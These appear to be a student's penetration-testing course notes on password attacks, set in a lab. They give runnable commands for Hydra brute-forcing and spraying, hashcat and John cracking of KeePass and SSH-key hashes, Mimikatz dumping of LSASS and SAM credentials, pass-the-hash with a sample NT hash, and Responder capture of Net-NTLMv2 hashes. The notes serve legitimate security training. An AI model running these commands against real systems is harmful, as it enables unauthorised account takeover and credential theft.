Attacking Newwork Services Login

common SSH and RDP services using THC Hydra

popular rockyou.txt

first always nmap -p- and nmap -sV for intresting ports

need to prepare rockyou.txt since it is compressed

gzip -d rockyou.txt.gz
uncompress

hydra -l <user name> -P /usr/share/wordlists/rockyou.txt -s <port> <portocol>://<IP>

eg:

hydra -l george -P /usr/share/wordlists/rockyou.txt -s 22 ssh://192.168.50.201

we can enumerate for username or attack build-in accounts such as root or Administrator


Password spraying: single password against a variety of usernames 

for pssword sprarying to work like brute forcing password the username must exist in the wordlist

we can append the wordlist using echo -e "<name>\n<name>\n<name>..." | sudo tee -a /usr/share/wordlists/dirb/others/name.txt

hydra -L /usr/share/wordlists/dirb/others/name.txt -p "<password>" <service>://<ip>

if we id usernames and passwords we can leverage passwords we discover by spraying them aginst target systems, this might reveal password reuse

dictionary attacks generate a lot of noise, large amount of net traffic can bring unstability to prod and prompt security to respond

note that -p != -P and that -l != -L
use captial letters for list and small letter for single element


HTTP POST login

if login into a web server is the only way of interaction then a dictionary attack is required

most web service has a default user account like admin

using Burp
we'll first capture the POST login attempt 
we'll need to provide the POST request to hydra

we'll also need to ID a failed login attemp, we'll capture the failed txt and present to hydra

using http-post-form "<login>:<POST request>:<failed message>"

eg:
hydra -l user -P /usr/share/wordlists/rockyou.txt <ip> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

^PASS^ for password placeholder


Password Cracking Fundamentals

Encryption Hashes and Cracking

using echo -n "<password>" | sha256sum
we hash the <password> sha256sum

Hashcat and John the Ripper
popular password cracking tools

JtR is more CPU basedd and Hashcat is GPU based

Hashcat requires OpenCL or CUDA

gpu is faster compared to CPU but some algos report CPU better

cracking time = keyspace / hash rate

hashcat -b for benchmarking hashrate


Mutating Wordlists

password policies requires a minimum password length as well as a combination of uppercase and lowercase letters

most passwords in the wordlists will not fulfill requirements

we need to manually prepare the wordlist by removing all passwords that do not satisfy the policy

rule-based attack, individual rules are implemented through rule functions, which are used to mod existing passwords in a list

https://hashcat.net/wiki/doku.php?id=rule_based_attack
rule based attack commands for hashcat

assume we face a password policy: requires an uppercase letter, a special character and a num

hashcat has rules in /usr/share/hashcat/rules/

$1 to append 1 to all passwords in a wordlist

aplly by
hashcat -r <rulefile> --stdout rockyou.txt
--stdout runs hashcat in debug mod

if rule functions are on the same line separated by a space hashcat will use them consecutively a AND arguement

if rule functions are on separate lines, hashcat will interprete them as 2 rules giving 2 or more variation of the same password
a OR arguement

hashcat -m <type> <hash>.txt /usr/share/wordlists/rockyou.txt -r <rule>.rule --force

--force ignores all warning
-m is the hash type:
https://hashcat.net/wiki/doku.php?id=example_hashes
-r for rule file


Cracking methodology

1. Extract hashes
2. Format hashes
3. Calculate cracking time
4. Prepare wordlist
5. Attack the hash

once obtained hash we need to determine algo, we can use hashid

depending on the source and the algo, we need to check if it is already in the correct format for the tool

determine feasibility
if cracking time is unrealistic we need to abort



Password Manager

1Password & KeePass

we have gained access to workstation with password manager, we'll extract password manager's database, transform the file into hashcat compatible and crack the master database password

for windows
Get-ChildItem to locate files in specified locations
-Path C:\ for entire drive
-Include to specify the file type or anything in general (*.kdbx)
-File to get list of files
-Recurse recursive function for deep search
-ErrorAction SilentlyContinue to mute error spam

The JtR has transformation scripts like ssh2jhon and _keepass2jhon_ 

so we just call one of the script 
keepass2jhon Database.kdbx > keepass.hash

hashcat --help | grep -i "KeePass"
this ids the keepass hash algo 

-r /usr/share/hashcat/rules/rockyou-30000.rule for hashcat rule


SSH Private Key Passphrase

we can gain access to the private keys via directory traversal 

private key id_rsa
remember to chmod 600 id_rsa inorder to use it

to use id_rsa
ssh -i id_rsa <user>@<ip>

ssh2john to trasform private key into ssh.hash
ssh2john id_rsa > ssh.hash

to use hashcat rules in JtR, 
add a name for the rules and append to /rtc/john/john.conf

sudo sh -c 'cat /home/kali/ssh.rule >> /etc/john/john.conf'

using JtR

john --wordlist = ssh.passwords --rules=sshRules ssh.hash


Working with Password Hashes

Cracking NTLM 

Windows stores hashed user passwords in SAM security account manager 

NTLM hashes are not salted

SAM db is at: C:\Windows\system32\config\sam
we can't just copy renmae or move the SAM db while the system is running because the kernel keeps an exclusive file system lock 

we can use the Mimikatz tool to bypass

Mimikatz sekurisa module can extract password hash from Local Security Authority Subsystem process memory

LSASS caches NTLM hashes and other credentials

we can only extract passwords if we run Mimikatz as Admin and have the SeDebugPrivilege access right enabled

we can also priv esc to SYSTEM with tools like PsExec or Mimikatz token elevation function

needs SelmpersonatePrivilege but all local admin have it by default


Get-LocalUser 
which users exist on the system

we cd to C:\tools 
and run
.\mimikatz.exe 


mimikatz commands consistes of module and command delimited by ::

privilege::debug

sekurlsa::logonpasswords
extract plaintext passwords and hashes from all sources

lsadump::sam
extract NTLM hsah from SAM
but we must first run token::elevate
to enable SeDebugPrivilege 
privilege::debug


Passing NTLM

pass the hash, auth to a target with valid combination of username and NTLM hash

MTLM/LM password hashes are not salted and is static

we also need admin to PtH 

start windows explorer and enter the path of the SMB share in the nav bar

we need tools that support auth with NTLM hashes

smbclient or crackmapexec for smb

scripts from the impacket library like psec.py and wmiexec.py for command execution

we are not limited to only smb

smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
-U to set user
--pw-nt-hash to indicate hash

impacket-psexec -hashes <NTLM hash (LMHash:NTHash)> username@IP
if we only have NTLM we can fill LMHash with 32 0 


cracking Net-NTLMv2

needd target to start an auth process with Net-NTLMv2 

we use Responder tool

ip a 
retrieve a list of all local interface on kali

sudo responder -I <listening interface>
-I for listening interface

we now request a smb action for the windwos machine by diring a none existsing share

dir \\<ip>\test

responder should have captured the hash

